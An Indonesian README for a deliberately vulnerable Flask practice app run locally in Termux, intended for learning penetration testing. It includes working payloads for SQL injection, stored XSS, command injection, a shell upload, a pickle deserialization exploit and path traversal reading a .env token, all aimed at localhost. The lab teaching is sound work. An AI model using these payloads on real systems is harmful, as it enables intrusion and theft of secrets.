# VulnWeb — Aplikasi Latihan Pentest (SENGAJA RENTAN)

⚠️ **PERINGATAN**
- Aplikasi ini sengaja dibuat rentan untuk belajar. JANGAN deploy ke internet publik / VPS / hosting manapun.
- Jalankan HANYA di HP/laptop milik sendiri, di jaringan lokal (localhost / WiFi rumah), tidak terhubung ke device orang lain.
- Jangan pernah pakai teknik ini ke sistem orang lain tanpa izin tertulis — itu ilegal.

## 1. Install di Termux

```bash
pkg update && pkg upgrade -y
pkg install python git -y
cd vulnweb
pip install -r requirements.txt
```

## 2. Jalankan servernya

```bash
python app.py
```

Server jalan di `http://0.0.0.0:5000`. Buka `http://127.0.0.1:5000` di browser HP yang sama.

Biarkan sesi ini tetap jalan. Buka sesi Termux baru (swipe dari tepi kiri layar → "New session") buat sesi serangan.

## 3. Install tools penyerangan di sesi baru

```bash
pkg install nmap curl -y
pip install sqlmap requests
```

## 4. Daftar kerentanan & cara nyerangnya

### A. SQL Injection — `/login`
```bash
curl -X POST http://127.0.0.1:5000/login \
  -d "username=' OR '1'='1&password=apasaja"
```
Atau pakai sqlmap:
```bash
sqlmap -u "http://127.0.0.1:5000/login" --data="username=admin&password=admin" -p username --batch
```

### B. IDOR / Broken Access Control — `/profile?id=`
```bash
curl "http://127.0.0.1:5000/profile?id=1"
curl "http://127.0.0.1:5000/profile?id=2"
```
Lihat: tanpa login pun bisa buka profil user lain cuma dengan ganti angka id.

### C. Stored XSS — `/guestbook`
```bash
curl -X POST http://127.0.0.1:5000/guestbook \
  -d "name=test&message=<script>alert(document.cookie)</script>"
```
Buka `/guestbook` di browser, script-nya akan jalan.

### D. Broken Auth / Insecure Design — `/reset_password`
```bash
curl -X POST http://127.0.0.1:5000/reset_password \
  -d "username=admin&new_password=hacked123"
```
Password admin berubah tanpa verifikasi apapun.

### E. SSRF — `/fetch`
```bash
curl -X POST http://127.0.0.1:5000/fetch -d "url=http://127.0.0.1:5000/"
```
Coba juga arahkan ke port lain yang jalan di device lu untuk lihat server jadi "proxy" buka akses internal.

### F. Command Injection — `/ping`
```bash
curl -X POST http://127.0.0.1:5000/ping -d "host=127.0.0.1; id"
```

### G. Unrestricted File Upload — `/upload`
```bash
echo "import os; os.system('id')" > shell.py
curl -X POST http://127.0.0.1:5000/upload -F "file=@shell.py"
curl http://127.0.0.1:5000/uploads/shell.py
```
Coba juga upload file `.html` berisi `<script>` untuk lihat stored XSS via file.

### H. Insecure Deserialization — `/load_config`
```python
# jalankan di python3, generate payload base64
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```
Lalu kirim hasilnya:
```bash
curl -X POST http://127.0.0.1:5000/load_config -d "config=PASTE_PAYLOAD_DI_SINI"
```

### I. Security Misconfiguration
- Cek header response: `curl -I http://127.0.0.1:5000` (lihat `Server:` header bocorin versi Werkzeug)
- Masukkan input aneh di `/login` buat trigger error SQL mentah ditampilkan ke user

### J. Vulnerable Components
Lihat `requirements.txt` — versi Flask & Werkzeug sengaja lawas. Coba cari CVE publik untuk versi tersebut sebagai latihan riset kerentanan komponen.

### K. Hidden Admin Panel + Path Traversal → bongkar token dari .env

Skenario: ada admin panel tersembunyi (nggak ada link-nya di web), lu harus nemuin lewat directory brute-force, lalu dari situ ada fitur baca file yang bisa dipaksa baca file lain, termasuk `.env` yang isinya token rahasia.

**Langkah 1 — cek robots.txt (sering bocorin path tersembunyi):**
```bash
curl http://127.0.0.1:5000/robots.txt
```

**Langkah 2 — atau brute-force path pakai gobuster/ffuf (kalau mau latihan "nemu sendiri" tanpa baca robots.txt):**
```bash
pkg install golang -y
go install github.com/OJ/gobuster/v3@latest
~/go/bin/gobuster dir -u http://127.0.0.1:5000 -w wordlist.txt -x txt
```
(butuh wordlist, atau cukup percaya ke hint robots.txt di atas buat latihan awal)

**Langkah 3 — buka admin panel yang ketemu (tanpa login sama sekali, itu kerentanannya):**
```bash
curl http://127.0.0.1:5000/admin-x7k9
```

**Langkah 4 — fitur "lihat log" di admin ternyata bisa path traversal:**
```bash
curl "http://127.0.0.1:5000/admin-x7k9/logs?file=access.log"
curl "http://127.0.0.1:5000/admin-x7k9/logs?file=../.env"
```
Yang terakhir bakal nampilin isi `.env`, termasuk `SECRET_API_TOKEN`.

## 5. Scan otomatis (opsional)
```bash
nmap -sV -p 5000 127.0.0.1
```

## 6. Reset database
Hapus `vulnweb.db` lalu jalankan ulang `python app.py` untuk reset data ke kondisi awal.
